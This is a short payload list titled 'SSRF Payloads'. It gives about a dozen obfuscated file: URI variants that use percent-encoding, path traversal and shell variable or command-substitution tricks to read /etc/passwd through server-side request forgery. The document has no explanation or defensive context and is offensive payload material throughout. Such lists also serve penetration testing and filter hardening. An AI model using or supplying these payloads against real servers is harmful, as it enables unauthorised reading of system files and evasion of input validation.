
<h1 align="center">SSRF Payloads</h1>

<h3>file:</h3>
## /etc/passwd

<pre><code>
file:/etc/passwd?/
file:/etc/passwd%3F/
file:/etc%252Fpasswd/
file:/etc%252Fpasswd%3F/
file:///etc/?/../passwd
file:///etc/%3F/../passwd
file:${br}/et${u}c/pas${te}swd?/
file:$(br)/et$(u)c/pas$(te)swd?/
file:${br}/et${u}c%252Fpas${te}swd?/
file:$(br)/et$(u)c%252Fpas$(te)swd?/
file:${br}/et${u}c%252Fpas${te}swd%3F/
file:$(br)/et$(u)c%252Fpas$(te)swd%3F/
file:///etc/passwd?/../passwd
</code></pre>
